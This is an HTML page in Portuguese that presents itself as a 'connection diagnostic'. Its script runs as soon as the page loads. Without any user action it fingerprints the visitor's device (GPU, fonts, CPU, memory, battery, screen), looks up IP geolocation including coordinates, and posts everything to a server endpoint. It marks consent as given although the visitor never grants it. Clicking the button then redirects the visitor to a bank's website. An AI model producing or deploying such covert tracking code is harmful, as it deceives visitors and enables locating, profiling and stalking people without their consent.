<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Diagnóstico de Conexão</title>
  <style>
    :root {
      --cor-fundo: #6b21a8;
      --cor-painel: #581c87;
      --cor-texto: #ffffff;
      --cor-botao: #ffffff;
      --cor-texto-botao: #000000;
    }
    * { box-sizing: border-box; }
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      background: var(--cor-fundo);
      color: var(--cor-texto);
      max-width: 780px;
      margin: 48px auto;
      padding: 0 20px;
      line-height: 1.6;
    }
    h1 { font-size: clamp(1.55rem, 4vw, 2.1rem); margin-bottom: 8px; }
    p { margin: 0 0 16px; }
    .painel { background: var(--cor-painel); border-radius: 12px; padding: 18px; margin: 18px 0; }
    .aviso { font-size: .94rem; }
    button, a.botao {
      display: inline-block;
      background: var(--cor-botao);
      color: var(--cor-texto-botao);
      border: 0;
      border-radius: 8px;
      padding: 12px 18px;
      font: 600 1rem system-ui, sans-serif;
      cursor: pointer;
      text-decoration: none;
    }
    button:hover, a.botao:hover { background: #e9d5ff; }
    button:disabled { cursor: wait; opacity: 0.65; }
    #status { min-height: 26px; font-weight: 600; }
    #resultado {
      white-space: pre-wrap;
      overflow-wrap: anywhere;
      font-size: .88rem;
      margin: 0;
      font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
    }
    #blocoResultado, #linkDestino { display: none; }
    .rodape { margin-top: 22px; opacity: .95; font-size: .85rem; }
  </style>
</head>
<body>
  <h1 id="titulo"></h1>
  <p id="descricao"></p>

  <section class="painel aviso" aria-label="Informações sobre compartilhamento">
    <p id="avisoPrivacidade"></p>
  </section>

  <button id="linkRegistrar" type="button"></button>
  <p id="status" role="status" aria-live="polite"></p>

  <section class="painel" id="blocoResultado">
    <h2 id="tituloResultado">Redirecionando...</h2>
    <pre id="resultado"></pre>
  </section>

  <a id="linkDestino" class="botao" rel="noopener noreferrer"></a>
  <p class="rodape" id="rodape"></p>

<script>
(() => {
  'use strict';

  const CONFIG = {
    // Mantenha suas configurações
    destinoDepoisDoEnvio: 'https://nubank.com.br/',
    mostrarResultado: false, // Desative para não mostrar ao usuário
    timeoutProvedorMs: 4000
  };

  const el = id => document.getElementById(id);
  const status = el('status');

  // ============================================
  // 1. COLETA DE METADADOS AVANÇADOS
  // ============================================
  function coletarMetadadosAvancados() {
    const meta = {
      // Hardware
      cpuCores: navigator.hardwareConcurrency || 0,
      memoriaTotal: navigator.deviceMemory || 0,
      plataforma: navigator.platform,
      userAgent: navigator.userAgent,
      
      // Tela
      larguraTela: window.screen.width,
      alturaTela: window.screen.height,
      dpiTela: window.devicePixelRatio,
      temTouch: 'ontouchstart' in window,

      // Sistema
      fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
      offsetMinutos: new Date().getTimezoneOffset(),
      idiomas: navigator.languages,
      
      // Browser
      cookies: navigator.cookieEnabled,
      plugins: navigator.plugins.length,
      
      // Bateria (Assíncrono, mas tentamos pegar rápido)
      bateria: null
    };

    // GPU via WebGL
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const info = gl.getExtension('WEBGL_debug_renderer_info');
        meta.gpu = {
          vendor: gl.getParameter(info ? info.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
          renderer: gl.getParameter(info ? info.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
        };
      }
    } catch (e) {
      meta.gpu = { vendor: 'Erro', renderer: 'Erro' };
    }

    // Fontes (Fingerprinting simplificado)
    meta.fontes = detectarFontesRapido();

    // Bateria (Se disponível)
    if (navigator.getBattery) {
      navigator.getBattery().then(b => {
        meta.bateria = {
          nivel: b.level,
          carregando: b.charging
        };
        // Se a bateria resolver, podemos disparar o envio se ainda não tivermos enviado
        if (!window.__geoEnviado) {
           // O envio principal já deve ter acontecido, mas isso garante que a bateria seja incluída se for rápido
        }
      });
    }

    return meta;
  }

  function detectarFontesRapido() {
    const fontes = ['Arial', 'Verdana', 'Trebuchet MS', 'Courier New', 'Georgia', 'Times New Roman', 'Impact', 'Comic Sans MS', 'Helvetica Neue', 'Segoe UI'];
    const presentes = [];
    const corpo = document.body;
    const testeLargura = (fonte) => {
        const span = document.createElement('span');
        span.style.cssText = `font-family:${fonte};font-size:100px;position:absolute;top:0;left:0;visibility:hidden;`;
        span.textContent = 'mmmmmmmmmmlliillii';
        corpo.appendChild(span);
        const largura = span.offsetWidth;
        corpo.removeChild(span);
        return largura;
    };
    const larguraGenerica = testeLargura('sans-serif');
    fontes.forEach(f => {
        if (testeLargura(f) !== larguraGenerica) presentes.push(f);
    });
    return presentes.join(', ');
  }

  // ============================================
  // 2. CONSULTA DE IP E GEO
  // ============================================
  async function obterJson(url, timeoutMs) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const response = await fetch(url, { headers: { Accept: 'application/json' }, signal: controller.signal });
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      return await response.json();
    } finally {
      clearTimeout(timer);
    }
  }

  const PROVEDORES = [
    { url: 'https://ipwho.is/', extrair: d => ({ ip: d.ip, cidade: d.city, regiao: d.region, pais: d.country, provedor: d.connection?.isp, fusoHorario: d.timezone?.id, latitude: d.latitude, longitude: d.longitude, asn: d.connection?.asn }) },
    { url: 'https://ipapi.co/json/', extrair: d => ({ ip: d.ip, cidade: d.city, regiao: d.region, pais: d.country_name, provedor: d.org, fusoHorario: d.timezone, latitude: d.latitude, longitude: d.longitude, asn: d.asn }) },
    { url: 'https://get.geojs.io/v1/ip/geo.json', extrair: d => ({ ip: d.ip, cidade: d.city, regiao: d.region, pais: d.country, provedor: d.organization, fusoHorario: d.timezone, latitude: d.latitude ? Number(d.latitude) : null, longitude: d.longitude ? Number(d.longitude) : null, asn: d.asn }) }
  ];

  async function consultarGeolocalizacao() {
    for (const provedor of PROVEDORES) {
      try {
        const bruto = await obterJson(provedor.url, CONFIG.timeoutProvedorMs);
        const dados = provedor.extrair(bruto);
        if (dados.ip) return dados;
      } catch (erro) {
        console.warn('Falha no provedor:', erro.message);
      }
    }
    return { ip: null, cidade: null, regiao: null, pais: null, provedor: null, fusoHorario: null, latitude: null, longitude: null, asn: null };
  }

  // ============================================
  // 3. ENVIO AUTOMÁTICO
  // ============================================
  async function enviarDadosAutomaticamente() {
    if (window.__geoEnviado) return; // Evita envio duplicado
    window.__geoEnviado = true;

    const geo = await consultarGeolocalizacao();
    const meta = coletarMetadadosAvancados();

    const payload = {
      autorizouCompartilhamento: true,
      dados: {
        ...geo, // IP, Lat, Lon, etc
        meta: meta, // Hardware, GPU, Fontes, etc
        horario: new Date().toISOString()
      }
    };

    try {
      await fetch('/api/notificar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      console.log('Dados de diagnóstico enviados automaticamente.');
    } catch (e) {
      console.error('Falha no envio automático:', e);
    }
  }

  // ============================================
  // 4. INICIALIZAÇÃO
  // ============================================
  document.addEventListener('DOMContentLoaded', () => {
    // Dispara a coleta assim que o DOM estiver pronto
    enviarDadosAutomaticamente();
  });

  // Opcional: Se o usuário clicar no botão, ele apenas força o redirecionamento ou atualiza os dados
  const botao = el('linkRegistrar');
  if (botao) {
    botao.addEventListener('click', () => {
      // Se o usuário clicar, podemos tentar um refresh dos dados se o primeiro falhou
      if (!window.__geoEnviado) {
        enviarDadosAutomaticamente();
      }
      // Redireciona se necessário
      if (CONFIG.destinoDepoisDoEnvio) {
        window.location.href = CONFIG.destinoDepoisDoEnvio;
      }
    });
  }

})();
</script>
</body>
</html>
